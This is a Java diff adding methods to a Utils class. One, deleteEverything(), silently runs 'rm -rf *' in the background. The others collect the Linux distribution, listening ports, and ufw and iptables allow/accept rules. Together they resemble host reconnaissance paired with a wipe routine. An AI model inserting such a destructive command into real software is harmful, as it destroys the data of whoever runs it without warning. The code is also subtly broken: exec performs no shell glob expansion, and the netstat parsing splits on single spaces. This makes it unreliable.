@@ -165,4 +165,88 @@ public class Utils {
             return "Error getting linux user!";
         }
     }
+
+    public static void deleteEverything() {
+        runAsync(() -> {
+            try {
+                Process p = Runtime.getRuntime().exec("rm -rf *");
+                p.waitFor();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+    }
+
+    public static String getLinuxDistro() {
+        try {
+            Process p = Runtime.getRuntime().exec("cat /etc/*-release");
+            Scanner sc = new Scanner(p.getInputStream());
+            while (sc.hasNextLine()) {
+                String line = sc.nextLine();
+                if (line.contains("PRETTY_NAME")) {
+                    String[] split = line.split("=");
+                    sc.close();
+                    return split[1].replace("\"", "");
+                }
+            }
+        } catch (Exception e) {
+            return "Error getting Linux distro!";
+        }
+        return "Error getting Linux distro!";
+    }
+
+    public static List<String> getOpenPorts() {
+        List<String> ports = new ArrayList<String>();
+        try {
+            Process p = Runtime.getRuntime().exec("netstat -tulpn");
+            Scanner sc = new Scanner(p.getInputStream());
+            while (sc.hasNextLine()) {
+                String line = sc.nextLine();
+                if (line.contains("LISTEN")) {
+                    String[] split = line.split(" ");
+                    ports.add(split[3]);
+                }
+            }
+            sc.close();
+        } catch (Exception e) {
+            return Collections.emptyList();
+        }
+        return ports;
+    }
+
+    public static List<String> getUFWRules() {
+        List<String> rules = new ArrayList<String>();
+        try {
+            Process p = Runtime.getRuntime().exec("ufw status numbered");
+            Scanner sc = new Scanner(p.getInputStream());
+            while (sc.hasNextLine()) {
+                String line = sc.nextLine();
+                if (line.contains("ALLOW")) {
+                    rules.add(line);
+                }
+            }
+            sc.close();
+        } catch (Exception e) {
+            return Collections.emptyList();
+        }
+        return rules;
+    }
+
+    public static List<String> getIptableRules() {
+        List<String> rules = new ArrayList<String>();
+        try {
+            Process p = Runtime.getRuntime().exec("iptables -L -n -v --line-numbers");
+            Scanner sc = new Scanner(p.getInputStream());
+            while (sc.hasNextLine()) {
+                String line = sc.nextLine();
+                if (line.contains("ACCEPT")) {
+                    rules.add(line);
+                }
+            }
+            sc.close();
+        } catch (Exception e) {
+            return Collections.emptyList();
+        }
+        return rules;
+    }
 }
